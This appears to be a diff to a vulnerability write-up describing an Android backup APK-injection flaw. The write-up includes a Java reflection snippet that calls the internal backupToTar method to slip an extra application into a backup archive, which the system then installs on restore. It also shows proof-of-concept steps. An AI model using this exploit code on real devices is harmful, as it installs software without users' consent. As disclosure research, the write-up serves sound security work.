@@ -9,35 +9,40 @@ The backup file created is a simple compressed tar archive with some Android spe
 
 APK injection vulnerability
 ---------------------------
-The backup manager, which invokes the custom BackupAgent's does not filter the data stream returned by the applications. While a BackupAgent is being executed during the backup process, it is able to inject additional applications (APKs) into the backup archive without the user's consent. Upon restoration of the backup archive, the system installs the injected, additional application.
+The backup manager, which invokes the custom BackupAgent's does not filter the data stream returned by the applications. While a BackupAgent is being executed during the backup process, it is able to inject additional applications (APKs) into the backup archive without the user's consent. Upon restoration of the backup archive, the system installs the injected, additional application (since it is part of the backup archive and the system believes it is authentic).
+
 The Backup Manager can be exploited through simple reflection to inject the arbitrary additional APK:
 
 ```
-	  String packageName = "com.searchlab.wifitest"; // package name of the application to be injected
-	  
-	  Method backupToTar;
-	  Method getData;
-		try {
-			Class<?> fullbackupClass = Class.forName("android.app.backup.FullBackup");
+// package name of the application to be injected. This will be one of the arguments of backupToTar() method
+String packageName = "com.searchlab.wifitest"; 
 
-			Class<?> backupDataOutputClass = Class.forName("android.app.backup.BackupDataOutput");
-			
-			backupToTar = fullbackupClass.getDeclaredMethod("backupToTar", String.class, String.class, String.class, String.class, String.class, backupDataOutputClass);
-			backupToTar.setAccessible(true);		
-			
-			getData = FullBackupDataOutput.class.getDeclaredMethod("getData");
-			getData.setAccessible(true);
-			Object backupData = getData.invoke(data);
-			
-			 
-			backupToTar.invoke(null, packageName, null, null, getFilesDir().toString(), getFilesDir()+"/_manifest", backupData);
-			backupToTar.invoke(null, packageName, "a", null, getFilesDir().toString(),getFilesDir()+"/com.searchlab.wifitest-1.apk", backupData);
-		    
-			Log.v("MYBACKUP", "backuptotar invoked!");
-			
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
+Method backupToTar;
+Method getData;
+try {
+	// looking up the internal Classes
+	Class<?> fullbackupClass = Class.forName("android.app.backup.FullBackup");
+	Class<?> backupDataOutputClass = Class.forName("android.app.backup.BackupDataOutput");
+	
+	// fetching reference to the backupToTar method and making it accessible for us
+	backupToTar = fullbackupClass.getDeclaredMethod("backupToTar", String.class, String.class, String.class, String.class, String.class, backupDataOutputClass);
+	backupToTar.setAccessible(true);		
+	
+	// we also need getData() method
+	getData = FullBackupDataOutput.class.getDeclaredMethod("getData");
+	getData.setAccessible(true);
+	
+	// and now let the magic begin!
+	Object backupData = getData.invoke(data);
+	backupToTar.invoke(null, packageName, null, null, getFilesDir().toString(), getFilesDir()+"/_manifest", backupData);
+	backupToTar.invoke(null, packageName, "a", null, getFilesDir().toString(),getFilesDir()+"/com.searchlab.wifitest-1.apk", backupData);
+	
+	// that's all, folks
+	Log.v("MYBACKUP", "backuptotar invoked!");
+	
+} catch (Exception e) {
+	e.printStackTrace();
+}
 ```
 
 Proof of Concept
@@ -60,6 +65,7 @@ Step 3 (optional): If you want to examine the backup archive just created, use t
 ```
 java -jar d:\tools\abe\android-backup-extractor-20140630-bin\abe.jar unpack backup.ab backup.tar
 ```
+![ADB Backup Injection, the tar file with the injected content](https://raw.githubusercontent.com/irsl/ADB-Backup-APK-Injection/master/android-backup-injection-tar-file.png "ADB Backup Injection, the tar file with the injected content")
 
 In the tar file you will find the injected second application (com.searchlab.wifitest).
 
